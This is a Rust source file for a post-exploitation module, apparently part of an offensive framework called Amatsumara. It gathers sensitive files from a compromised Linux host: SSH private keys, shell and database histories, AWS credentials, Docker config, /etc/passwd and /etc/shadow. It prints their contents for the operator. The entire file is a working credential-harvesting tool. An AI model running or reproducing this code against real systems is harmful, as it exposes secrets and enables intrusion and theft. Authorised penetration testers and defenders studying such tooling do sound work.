use amatsumara_api::*;
use std::ffi::{c_char, c_int, c_void, CStr};
use std::fs;
use std::path::Path;

static NAME: &str = "Linux Sensitive File Gatherer";
static DESCRIPTION: &str = "Searches for and reads sensitive files like SSH keys, bash history, and config files";
static AUTHOR: &str = "Amatsumara Project";

static PLATFORMS: &[Platform] = &[Platform::Linux];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86, Arch::ARM64];

static OPTIONS: &[ModuleOption] = &[];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Post,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

struct PostModule;

impl PostModule {
    fn new() -> Box<Self> { Box::new(Self) }

    fn gather(&self) -> i32 {
        eprintln!("[*] Linux Sensitive File Gatherer");
        eprintln!();

        let home = std::env::var("HOME").unwrap_or_else(|_| String::from("/root"));

        let targets = vec![
            format!("{}/.ssh/id_rsa", home),
            format!("{}/.ssh/id_dsa", home),
            format!("{}/.ssh/id_ecdsa", home),
            format!("{}/.ssh/id_ed25519", home),
            format!("{}/.ssh/authorized_keys", home),
            format!("{}/.ssh/known_hosts", home),
            format!("{}/.bash_history", home),
            format!("{}/.zsh_history", home),
            format!("{}/.mysql_history", home),
            format!("{}/.psql_history", home),
            format!("{}/.aws/credentials", home),
            format!("{}/.aws/config", home),
            format!("{}/.docker/config.json", home),
            String::from("/etc/passwd"),
            String::from("/etc/shadow"),
            String::from("/etc/hosts"),
        ];

        for target in targets {
            if Path::new(&target).exists() {
                match fs::read_to_string(&target) {
                    Ok(content) => {
                        eprintln!("[+] Found: {}", target);
                        eprintln!("--- Content ({} bytes) ---", content.len());
                        if content.len() < 1000 {
                            eprintln!("{}", content);
                        } else {
                            eprintln!("{}... [truncated]", &content[..500]);
                        }
                        eprintln!();
                    }
                    Err(e) => {
                        eprintln!("[-] Cannot read {}: {}", target, e);
                    }
                }
            }
        }

        eprintln!("[*] Enumeration complete");
        0
    }
}

extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void { Box::into_raw(PostModule::new()) as *mut c_void }
extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() {
        unsafe { let _ = Box::from_raw(instance as *mut PostModule); }
    }
}

extern "C" fn run(_instance: *mut c_void, _options_json: *const c_char) -> c_int {
    let module = PostModule::new();
    module.gather()
}

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable { &VTABLE }
